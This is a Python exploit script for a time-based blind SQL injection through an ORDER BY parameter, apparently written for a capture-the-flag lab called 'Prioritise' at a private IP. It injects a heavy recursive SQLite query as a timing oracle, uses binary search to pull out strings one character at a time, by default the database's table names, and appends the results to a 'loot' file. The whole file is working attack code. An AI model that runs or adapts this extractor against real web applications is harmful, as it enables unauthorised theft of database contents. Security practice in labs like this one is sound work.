#!/usr/bin/env python3
"""Blind ORDER BY SQLi extractor for the Prioritise room (SQLite).
Oracle: ?order=CASE WHEN (<cond>) THEN (<heavy CTE>) ELSE title END
  - cond TRUE  -> heavy branch runs -> ~2-3s delay -> HTTP 200
  - cond FALSE -> uses title        -> fast (~0.4s)  -> HTTP 200
Both return 200; we distinguish by response time only.
"""
import urllib.parse, urllib.request, time, sys

URL = "http://10.64.172.157/"
HEAVY = ("WITH RECURSIVE c(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM c "
         "WHERE n<3000000) SELECT count(*) FROM c")
THRESH = 1500  # ms; TRUE if elapsed above this (FALSE ~440ms, TRUE ~3.3s)

def query(order_payload):
    enc = urllib.parse.quote(order_payload)
    req = urllib.request.Request(URL + "?order=" + enc)
    t0 = time.time()
    try:
        urllib.request.urlopen(req, timeout=30).read()
    except urllib.error.HTTPError:
        pass
    return (time.time() - t0) * 1000.0

def oracle(cond, trials=1):
    """Return True if condition is true (consistently slow)."""
    slow = 0
    for _ in range(trials):
        ms = query(f"CASE WHEN ({cond}) THEN ({HEAVY}) ELSE title END")
        if ms > THRESH:
            slow += 1
    return slow >= (trials // 2 + 1)

def binsearch(cond_template, lo, hi, label=""):
    """Binary search the integer returned by cond_template(mid): cond_template is
    a function taking mid and returning the SQL comparison string."""
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(cond_template(mid)):
            lo = mid + 1
        else:
            hi = mid
    # lo is the smallest value where the predicate is false => answer = lo
    return lo

def length_of(sql_expr):
    # find smallest N such that length(expr) >= N is FALSE -> length = N-1
    # i.e. length <= N-1. Use predicate length(expr) > mid
    n = binsearch(lambda m: f"length(({sql_expr}))>{m}", 0, 4096)
    # binsearch returns first mid where 'length>mid' is FALSE => length == mid
    return n

def extract_string(sql_expr):
    ln = length_of(sql_expr)
    print(f"[*] length({sql_expr}) = {ln}", flush=True)
    out = []
    for i in range(1, ln + 1):
        # find codepoint: smallest c where unicode(substr)>c is FALSE => codepoint=c
        cp = binsearch(lambda m: f"unicode(substr(({sql_expr}),{i},1))>{m}", 0, 255)
        out.append(chr(cp) if 0 < cp < 1114112 else '?')
        if i % 10 == 0:
            print(f"[*] ...{''.join(out)}", flush=True)
    return ''.join(out)

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "(SELECT group_concat(name,'|') FROM sqlite_master WHERE type='table')"
    print(f"[*] Extracting: {target}")
    result = extract_string(target)
    print(f"[+] RESULT: {result}")
    with open("loot/extracted.txt", "a") as f:
        f.write(f"{target} => {result}\n")
